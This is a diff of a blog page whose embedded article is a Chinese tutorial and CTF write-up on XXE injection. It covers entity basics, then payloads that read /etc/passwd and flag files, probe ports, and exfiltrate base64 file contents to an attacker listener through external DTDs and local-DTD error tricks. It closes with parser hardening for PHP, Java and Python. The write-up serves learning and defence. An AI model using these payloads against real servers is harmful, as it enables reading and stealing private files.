@@ -11,7 +11,7 @@
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"articleBody":"\n\n\n\n基础知识xml 定义xml的版本和编码\n1&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n\ndtd 文档类型定义\n1&lt;!DOCTYPE 根元素名 [元素描述] &gt;  文档类型定义DTD\n\n向文档中添加实体\n12&lt;!ENTITY 实体名称 \"实体的值\" &gt; 内部引入&lt;!ENTITY 实体名称 SYSTEM \"URI\" &gt;\n\n除参数实体外，实体都以&amp;开头 以 ;结尾\n参数实体\n以% 开头\n内部实体\n在一个实体的定义中定义，也叫嵌套实体\n1234&lt;!DOCTYPE root [&lt;!ENTITY % param1 \"&lt;!ENTITY p1k 'http://www.baidu.com'&gt;\"&gt;%param1; ]&gt;\n\nparam1 是参数实体  p1k是内部实体\n外部实体\n外部实体表示外部文件的内容，通过system引入\n1&lt;!ENTITY 实体名称 SYSTEM \"URI\" &gt;\n\nphp中可以引发xxe注入的类和函数\nphp有三个可以导致xxe问题的类和函数\n123DOMDocumentSimpleXMLElementsimplexml_load_string\n\nxxe注入直接引入外部文件\n123&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt;\n\n限制条件\n有回显\n没有禁用外部实体\n端口扫描12345&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;  &lt;!DOCTYPE data SYSTEM \"http://127.0.0.1:515/\" [  &lt;!ELEMENT data (#PCDATA)&gt;  ]&gt;&lt;data&gt;4&lt;/data&gt;\n\n根据响应时间来判断\nCDATA注入cdata内的数据不会被解析，就算有特殊符号也没事(除了]])\n测试代码\n12345678&lt;?phplibxml_disable_entity_loader (false);$xmlfile = file_get_contents('php://input');$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom);echo $creds;?&gt;\n\npayload\n123456789&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start \"&lt;![CDATA[\"&gt;   &lt;!ENTITY % goodies SYSTEM \"file:///d:/test.txt\"&gt;  &lt;!ENTITY % end \"]]&gt;\"&gt;  &lt;!ENTITY % dtd SYSTEM \"http://ip/evil.dtd\"&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt;\n\nevil.dtd\n12&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!ENTITY all \"%start;%goodies;%end;\"&gt;\n\n复现未成功\nOOB注入服务器没有回显，需要把数据传的VPS上\n因为xml 规定不允许在一个实体的定义中调用另一个实体，所以 不能这么写（不同的xml解释器解析结果不一样，有的解析器是允许这样写的 见下面的google ctf） 这里就以不能这样写 为例\n123456&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % param1 \"file:///c:/1.txt\"&gt;&lt;!ENTITY % param2 \"http://127.0.0.1/?%param1\"&gt;%param2;]&gt;\n\nw3c的XML协议上 ，又这样一段话\n123在内部DTD集中，参数实体的引用不能存在于标记的声明中。这并不适用于外部的参数实体中。这意味着，协议本身就必须要求不能在内部的实体声明中引用参数\n\n所以可以利用外部实体，\n测试代码\n12345&lt;?php  libxml_disable_entity_loader(false);$xml=file_get_contents('php://input');$data = simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT | LIBXML_DTDLOAD);?&gt;\n\n在VPS上放一个dtd文件\n12&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///1.txt\"&gt;&lt;!ENTITY % int \"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.110.135:9999?p=%file;'&gt;\"&gt;\n\npayload\n1234&lt;!DOCTYPE convert [&lt;!ENTITY % remote SYSTEM \"http://192.168.110.135/evil2.dtd\"&gt;%remote;%int;%send;]&gt;\n\nVPS上开启监听\n123456root@kali:/var/www/html# nc -lvp 9999listening on [any] 9999 ...192.168.110.1: inverse host lookup failed: Unknown hostconnect to [192.168.110.135] from (UNKNOWN) [192.168.110.1] 21525GET /?p=d3FzcXdz HTTP/1.0Host: 192.168.110.135:9999\n\n限制条件\n可以导入外部实体\n基于报错的OOB原理和上面的OOB一样，不过把url改成了一个错误的url,让程序报错，把结果显示出来\n测试\nevil2.dtd\n12&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///1.txt\"&gt;&lt;!ENTITY % int \"&lt;!ENTITY &amp;#x25; send SYSTEM 'file:///adminsb/%file;'&gt;\"&gt;\n\npayload\n1234&lt;!DOCTYPE convert [&lt;!ENTITY % remote SYSTEM \"http://192.168.110.135/evil2.dtd\"&gt;%remote;%int;%send;]&gt;\n\n结果\n1Warning: simplexml_load_string(): I/O warning : failed to load external entity &quot;file:///adminsb/d3FzcXdz&quot;\n\n导入本地文件xml是实体都是常量，所以 如果定义两个相同的实体，则仅使用第一个实体\nogeek  查看源码 有一个js文件 很可疑 进去看看，\n发送一个数据包 ，xml文档构造正确时，状态码200 错误时500\n去kali下搜索一下 .dtd文件 \n1find / name \"*.dtd\"\n\n找到一个fonts.dtd\n这里面有一段代码\n12&lt;!ENTITY % constant &apos;int|double|string|matrix|bool|charset|langset|const&apos;&gt;&lt;!ELEMENT patelt (%constant;)*&gt;\n\n可以闭合%constant \n类似于sql注入\n12345678910111213141516&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;&gt;    &lt;!ENTITY % constant &apos;aaa)&gt;        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/%file;&apos;&gt;&quot;&gt;        &amp;#x25;eval;        &amp;#x25;error;        &lt;!ELEMENT aa (bb&apos;&gt;    %local_dtd;]&gt;&lt;message&gt;any text&lt;/message&gt;\n\n分析一下，调用过程\n首先 调用了local_dtd 加载fonts.dtd文件，这个文件会去调用%constant实体\n因为两个实体只解析第一个，所以构造的 %constant被解析，\n123456&lt;!ELEMENT patelt (aaa)&gt;        &lt;!ENTITY &amp;#x25; file SYSTEM \"file:///flag\"&gt;        &lt;!ENTITY &amp;#x25; eval \"&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/%file;'&gt;\"&gt;        &amp;#x25;eval;        &amp;#x25;error;        &lt;!ELEMENT aa (bb)*&gt;\n\n现在变成了这样 fonts.dtd文件在向下解析的时候就回去调用，构造好的 eval error\n结果\n\nwindows下的dtd文件查找放两个默认的\n12C:/Windows/System32/wbem/xml/cim20.dtdC:/Windows/System32/wbem/xml/wmi20.dtd\n\n123&lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd&quot;&gt;&lt;!ENTITY % SuperClass &apos;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&apos;&gt;%local_dtd;\n\nCisco WebEx123&lt;!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd\"&gt;&lt;!ENTITY % url.attribute.set '&gt;Your DTD code&lt;!ENTITY test \"test\"'&gt;%local_dtd;\n\nCitrix XenMobile Server123&lt;!ENTITY % local_dtd SYSTEM \"jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd\"&gt;&lt;!ENTITY % Body '&gt;Your DTD code&lt;!ENTITY test \"test\"'&gt;%local_dtd;\n\nCustom Multi-Platform IBM WebSphere Application1234567891011&lt;!ENTITY % local_dtd SYSTEM \"./../../properties/schemas/j2ee/XMLSchema.dtd\"&gt;&lt;!ENTITY % xs-datatypes 'Your DTD code'&gt;&lt;!ENTITY % simpleType \"a\"&gt;&lt;!ENTITY % restriction \"b\"&gt;&lt;!ENTITY % boolean \"(c)\"&gt;&lt;!ENTITY % URIref \"CDATA\"&gt;&lt;!ENTITY % XPathExpr \"CDATA\"&gt;&lt;!ENTITY % QName \"NMTOKEN\"&gt;&lt;!ENTITY % NCName \"NMTOKEN\"&gt;&lt;!ENTITY % nonNegativeInteger \"NMTOKEN\"&gt;%local_dtd;\n\ngoogle ctf  bnv查看源码，有个js文件，进去看看，\n有这样几行代码，应该是向api/search  发送xml数据\n123var url = '/api/search';xhr = new XMLHttpRequest();xhr.open('POST', url, true);\n\n直接用本地dtd文件 打一下\npayload1\n123456789101112&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE message [\t&lt;!ELEMENT message ANY&gt;\t&lt;!ENTITY % remote SYSTEM \"/usr/share/yelp/dtd/docbookx.dtd\"&gt;\t&lt;!ENTITY % para1 SYSTEM \"file:///flag\"&gt;\t&lt;!ENTITY % ISOamso '\t\t&lt;!ENTITY &amp;#x25; para2 \"&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;\"&gt;\t\t&amp;#x25;para2;\t'&gt;\t%remote;]&gt;&lt;message&gt;10&lt;/message&gt;\n\npayload2\n1234567891011&lt;?xml version=\"1.0\" ?&gt;&lt;!DOCTYPE message [&lt;!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\"&gt;&lt;!ENTITY % ISOamsa '\t&lt;!ENTITY &amp;#x25; file SYSTEM \"file:///flag\"&gt;\t&lt;!ENTITY &amp;#x25; eval \"&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;\"&gt;\t&amp;#x25;eval;\t&amp;#x25;error;'&gt;%local_dtd;&lt;message&gt;any text&lt;/message&gt;\n\n拿到flag\n实例apache solr防御php1libxml_disable_entity_loader(true);\n\njava12345678DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\",true);.setFeature(\"http://xml.org/sax/features/external-general-entities\",false).setFeature(\"http://xml.org/sax/features/external-parameter-entities\",false);\n\npython12from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))\n\n参考链接\nhttps://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/\nhttps://xz.aliyun.com/t/3357#toc-17\nhttps://blog.szfszf.top/tech/blind-xxe-%E8%AF%A6%E8%A7%A3-google-ctf-%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/\n","dateCreated":"2019-09-23T16:40:48+08:00","dateModified":"2020-02-10T17:29:53+08:00","datePublished":"2019-09-23T16:40:48+08:00","description":"","headline":"xxe","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/23/xxe/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"url":"http://yoursite.com/2019/09/23/xxe/"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"\n\n\n\n基础知识xml 定义xml的版本和编码\n1&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n\ndtd 文档类型定义\n1&lt;!DOCTYPE 根元素名 [元素描述] &gt;  文档类型定义DTD\n\n向文档中添加实体\n12&lt;!ENTITY 实体名称 \"实体的值\" &gt; 内部引入&lt;!ENTITY 实体名称 SYSTEM \"URI\" &gt;\n\n除参数实体外，实体都以&amp;开头 以 ;结尾\n参数实体\n以% 开头\n内部实体\n在一个实体的定义中定义，也叫嵌套实体\n1234&lt;!DOCTYPE root [&lt;!ENTITY % param1 \"&lt;!ENTITY p1k 'http://www.baidu.com'&gt;\"&gt;%param1; ]&gt;\n\nparam1 是参数实体  p1k是内部实体\n外部实体\n外部实体表示外部文件的内容，通过system引入\n1&lt;!ENTITY 实体名称 SYSTEM \"URI\" &gt;\n\nphp中可以引发xxe注入的类和函数\nphp有三个可以导致xxe问题的类和函数\n123DOMDocumentSimpleXMLElementsimplexml_load_string\n\nxxe注入直接引入外部文件\n123&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt;\n\n限制条件\n有回显\n没有禁用外部实体\n端口扫描12345&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;  &lt;!DOCTYPE data SYSTEM \"http://127.0.0.1:515/\" [  &lt;!ELEMENT data (#PCDATA)&gt;  ]&gt;&lt;data&gt;4&lt;/data&gt;\n\n根据响应时间来判断\nCDATA注入cdata内的数据不会被解析，就算有特殊符号也没事(除了]])\n测试代码\n12345678&lt;?phplibxml_disable_entity_loader (false);$xmlfile = file_get_contents('php://input');$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom);echo $creds;?&gt;\n\npayload\n123456789&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start \"&lt;![CDATA[\"&gt;   &lt;!ENTITY % goodies SYSTEM \"file:///d:/test.txt\"&gt;  &lt;!ENTITY % end \"]]&gt;\"&gt;  &lt;!ENTITY % dtd SYSTEM \"http://ip/evil.dtd\"&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt;\n\nevil.dtd\n12&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!ENTITY all \"%start;%goodies;%end;\"&gt;\n\n复现未成功\nOOB注入服务器没有回显，需要把数据传的VPS上\n因为xml 规定不允许在一个实体的定义中调用另一个实体，所以 不能这么写（不同的xml解释器解析结果不一样，有的解析器是允许这样写的 见下面的google ctf） 这里就以不能这样写 为例\n123456&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % param1 \"file:///c:/1.txt\"&gt;&lt;!ENTITY % param2 \"http://127.0.0.1/?%param1\"&gt;%param2;]&gt;\n\nw3c的XML协议上 ，又这样一段话\n123在内部DTD集中，参数实体的引用不能存在于标记的声明中。这并不适用于外部的参数实体中。这意味着，协议本身就必须要求不能在内部的实体声明中引用参数\n\n所以可以利用外部实体，\n测试代码\n12345&lt;?php  libxml_disable_entity_loader(false);$xml=file_get_contents('php://input');$data = simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT | LIBXML_DTDLOAD);?&gt;\n\n在VPS上放一个dtd文件\n12&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///1.txt\"&gt;&lt;!ENTITY % int \"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.110.135:9999?p=%file;'&gt;\"&gt;\n\npayload\n1234&lt;!DOCTYPE convert [&lt;!ENTITY % remote SYSTEM \"http://192.168.110.135/evil2.dtd\"&gt;%remote;%int;%send;]&gt;\n\nVPS上开启监听\n123456root@kali:/var/www/html# nc -lvp 9999listening on [any] 9999 ...192.168.110.1: inverse host lookup failed: Unknown hostconnect to [192.168.110.135] from (UNKNOWN) [192.168.110.1] 21525GET /?p=d3FzcXdz HTTP/1.0Host: 192.168.110.135:9999\n\n限制条件\n可以导入外部实体\n基于报错的OOB原理和上面的OOB一样，不过把url改成了一个错误的url,让程序报错，把结果显示出来\n测试\nevil2.dtd\n12&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///1.txt\"&gt;&lt;!ENTITY % int \"&lt;!ENTITY &amp;#x25; send SYSTEM 'file:///adminsb/%file;'&gt;\"&gt;\n\npayload\n1234&lt;!DOCTYPE convert [&lt;!ENTITY % remote SYSTEM \"http://192.168.110.135/evil2.dtd\"&gt;%remote;%int;%send;]&gt;\n\n结果\n1Warning: simplexml_load_string(): I/O warning : failed to load external entity &quot;file:///adminsb/d3FzcXdz&quot;\n\n导入本地文件xml是实体都是常量，所以 如果定义两个相同的实体，则仅使用第一个实体\nogeek  查看源码 有一个js文件 很可疑 进去看看，\n发送一个数据包 ，xml文档构造正确时，状态码200 错误时500\n去kali下搜索一下 .dtd文件 \n1find / name \"*.dtd\"\n\n找到一个fonts.dtd\n这里面有一段代码\n12&lt;!ENTITY % constant &apos;int|double|string|matrix|bool|charset|langset|const&apos;&gt;&lt;!ELEMENT patelt (%constant;)*&gt;\n\n可以闭合%constant \n类似于sql注入\n12345678910111213141516&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;&gt;    &lt;!ENTITY % constant &apos;aaa)&gt;        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/%file;&apos;&gt;&quot;&gt;        &amp;#x25;eval;        &amp;#x25;error;        &lt;!ELEMENT aa (bb&apos;&gt;    %local_dtd;]&gt;&lt;message&gt;any text&lt;/message&gt;\n\n分析一下，调用过程\n首先 调用了local_dtd 加载fonts.dtd文件，这个文件会去调用%constant实体\n因为两个实体只解析第一个，所以构造的 %constant被解析，\n123456&lt;!ELEMENT patelt (aaa)&gt;        &lt;!ENTITY &amp;#x25; file SYSTEM \"file:///flag\"&gt;        &lt;!ENTITY &amp;#x25; eval \"&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/%file;'&gt;\"&gt;        &amp;#x25;eval;        &amp;#x25;error;        &lt;!ELEMENT aa (bb)*&gt;\n\n现在变成了这样 fonts.dtd文件在向下解析的时候就回去调用，构造好的 eval error\n结果\n\nwindows下的dtd文件查找放两个默认的\n12C:/Windows/System32/wbem/xml/cim20.dtdC:/Windows/System32/wbem/xml/wmi20.dtd\n\n123&lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd&quot;&gt;&lt;!ENTITY % SuperClass &apos;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&apos;&gt;%local_dtd;\n\nCisco WebEx123&lt;!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd\"&gt;&lt;!ENTITY % url.attribute.set '&gt;Your DTD code&lt;!ENTITY test \"test\"'&gt;%local_dtd;\n\nCitrix XenMobile Server123&lt;!ENTITY % local_dtd SYSTEM \"jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd\"&gt;&lt;!ENTITY % Body '&gt;Your DTD code&lt;!ENTITY test \"test\"'&gt;%local_dtd;\n\nCustom Multi-Platform IBM WebSphere Application1234567891011&lt;!ENTITY % local_dtd SYSTEM \"./../../properties/schemas/j2ee/XMLSchema.dtd\"&gt;&lt;!ENTITY % xs-datatypes 'Your DTD code'&gt;&lt;!ENTITY % simpleType \"a\"&gt;&lt;!ENTITY % restriction \"b\"&gt;&lt;!ENTITY % boolean \"(c)\"&gt;&lt;!ENTITY % URIref \"CDATA\"&gt;&lt;!ENTITY % XPathExpr \"CDATA\"&gt;&lt;!ENTITY % QName \"NMTOKEN\"&gt;&lt;!ENTITY % NCName \"NMTOKEN\"&gt;&lt;!ENTITY % nonNegativeInteger \"NMTOKEN\"&gt;%local_dtd;\n\ngoogle ctf  bnv查看源码，有个js文件，进去看看，\n有这样几行代码，应该是向api/search  发送xml数据\n123var url = '/api/search';xhr = new XMLHttpRequest();xhr.open('POST', url, true);\n\n直接用本地dtd文件 打一下\npayload1\n123456789101112&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE message [\t&lt;!ELEMENT message ANY&gt;\t&lt;!ENTITY % remote SYSTEM \"/usr/share/yelp/dtd/docbookx.dtd\"&gt;\t&lt;!ENTITY % para1 SYSTEM \"file:///flag\"&gt;\t&lt;!ENTITY % ISOamso '\t\t&lt;!ENTITY &amp;#x25; para2 \"&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;\"&gt;\t\t&amp;#x25;para2;\t'&gt;\t%remote;]&gt;&lt;message&gt;10&lt;/message&gt;\n\npayload2\n1234567891011&lt;?xml version=\"1.0\" ?&gt;&lt;!DOCTYPE message [&lt;!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\"&gt;&lt;!ENTITY % ISOamsa '\t&lt;!ENTITY &amp;#x25; file SYSTEM \"file:///flag\"&gt;\t&lt;!ENTITY &amp;#x25; eval \"&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;\"&gt;\t&amp;#x25;eval;\t&amp;#x25;error;'&gt;%local_dtd;&lt;message&gt;any text&lt;/message&gt;\n\n拿到flag\n实例apache solr防御php1libxml_disable_entity_loader(true);\n\njava12345678DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\",true);.setFeature(\"http://xml.org/sax/features/external-general-entities\",false).setFeature(\"http://xml.org/sax/features/external-parameter-entities\",false);\n\npython12from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))\n\n参考链接\nhttps://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/\nhttps://xz.aliyun.com/t/3357#toc-17\nhttps://blog.szfszf.top/tech/blind-xxe-%E8%AF%A6%E8%A7%A3-google-ctf-%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/\n","dateCreated":"2019-09-23T16:40:48+08:00","dateModified":"2020-02-10T17:29:53+08:00","datePublished":"2019-09-23T16:40:48+08:00","description":"","headline":"xxe","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/23/xxe/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://yoursite.com/2019/09/23/xxe/"}</script>
     <meta name="description" content="基础知识xml 定义xml的版本和编码 1&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;  dtd 文档类型定义 1&amp;lt;!DOCTYPE 根元素名 [元素描述] &amp;gt;  文档类型定义DTD  向文档中添加实体 12&amp;lt;!ENTITY 实体名称 &quot;实体的值&quot; &amp;gt; 内部引入&amp;lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot; &amp;">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="xxe">
@@ -166,138 +166,6 @@
                         >
                         <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
                         <span class="sidebar-button-desc">关于</span>
-                    </a>
-            </li>
-            
-        </ul>
-        
-            <ul class="sidebar-buttons">
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://github.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="GitHub"
-                        >
-                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">GitHub</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="http://stackoverflow.com/users"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Stack Overflow"
-                        >
-                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Stack Overflow</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://twitter.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Twitter"
-                        >
-                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Twitter</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://facebook.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Facebook"
-                        >
-                        <i class="sidebar-button-icon fab fa-facebook" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Facebook</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://plus.google.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Google Plus"
-                        >
-                        <i class="sidebar-button-icon fab fa-google-plus" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Google Plus</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://www.linkedin.com/profile/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="LinkedIn"
-                        >
-                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">LinkedIn</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/mailto"
-                            
-                            rel="noopener"
-                            title="邮箱"
-                        >
-                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">邮箱</span>
-                    </a>
-            </li>
-            
-        </ul>
-        
-            <ul class="sidebar-buttons">
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/atom.xml"
-                            
-                            rel="noopener"
-                            title="RSS"
-                        >
-                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">RSS</span>
                     </a>
             </li>
             
